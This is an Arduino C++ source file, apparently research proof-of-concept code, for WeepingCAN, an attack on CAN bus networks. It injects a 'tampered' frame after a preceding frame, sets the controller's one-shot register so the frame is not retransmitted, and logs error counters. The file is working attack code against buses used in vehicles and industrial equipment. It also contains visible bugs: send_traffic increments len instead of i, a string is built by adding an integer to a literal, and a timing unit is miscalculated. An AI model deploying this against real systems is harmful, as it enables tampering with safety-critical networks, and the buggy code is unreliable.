#include "utils.h"

float msg_duration_micros(const uint32_t bps, const uint8_t dlc)
{

  constexpr uint8_t CAN_FRAME_OVH = 1 + 11 + 1 + 1 + 1 + 4 + 15 + 1 + 1 + 1 + 7 + 3;
  float bpus = bps / 1e9;
  auto frame_bits = CAN_FRAME_OVH + (dlc * 8);

  return frame_bits / bpus;
}

bool synchronise(uint16_t can_id, int max_tries)
{
  for (int tries = 0; tries < max_tries; tries++)
  {
    if (CAN.available() && CAN.read().id == can_id)
    {
      return true;
    }
  }
  return false;
}

void attack(CanMsg &preceding, CanMsg &tampered)
{
  // do not put serial prints in the middle of transmission since it could cause timing issues
  bool success_prec = (CAN.write(preceding) >= 0);
  // For WeepingCAN we have to disable retransmission of the tampered message, this is supported by the peripheral.
  // Unfortunately the library doesnt support this so we need to do it by hand with registers.
  // For further reference check RA4M1 user manual section 30.2.9 oneshot flag on the Message Control Register for Transmit
  // In the library only mailbox 0 is used for transmission of standard id frames so then we know which register to manipulate

  // ARM gcc goes from LSB to MSB
  typedef union
  {
    struct
    {
      uint8_t SENTDATA : 1;
      uint8_t TRMACTIVE : 1;
      uint8_t TRMABT : 1;
      uint8_t : 1;
      uint8_t ONESHOT : 1;
      uint8_t : 1;
      uint8_t RECREQ : 1;
      uint8_t TRMREQ : 1;
    };
    uint8_t reg;
  } MCTL;
  // Init new config with current register value
  volatile MCTL mctl;
  mctl.reg = *((volatile uint8_t *)MCTL_TX0);
  mctl.RECREQ = 0;
  mctl.TRMREQ = 1;
  mctl.ONESHOT = 1;
  // Set config
  *((volatile uint8_t *)MCTL_TX0) = mctl.reg;
  bool success_tamp = (CAN.write(tampered) >= 0);
  // Read back register
  mctl.reg = *((volatile uint8_t *)MCTL_TX0);
  success_tamp = success_tamp && !(mctl.TRMABT);
  // Restore normal operation
  mctl.RECREQ = 0;
  mctl.TRMREQ = 1;
  mctl.ONESHOT = 0;
  *((volatile uint8_t *)MCTL_TX0) = mctl.reg;
  if (success_prec)
  {
    Serial.println("Written preceding message with id " + String(preceding.id));
  }
  else
  {
    Serial.println("Failed to write preceding message");
  }
  if (success_tamp)
  {
    Serial.println("Written tampered message with id " + String(tampered.id));
  }
  else
  {
    Serial.println("Failed to write tampered message");
  }
}

void log_error_counters()
{
  // Direct register access since the library does not support them yet
  auto tec = *((volatile uint32_t *)TECR);
  auto rec = *((volatile uint32_t *)RECR);
  Serial.println("TEC:" + String(tec) + ",REC:" + String(rec));
}

void send_traffic(const CanMsg messages[], uint32_t len) {
  for (int i = 0; i < len; len++) {
    if (CAN.write(messages[i]) < 0) {
      Serial.println("Failed to send normal traffic message with id " + messages[i].id);
    }
    log_error_counters();
  }
  Serial.println("Traffic sent");
}
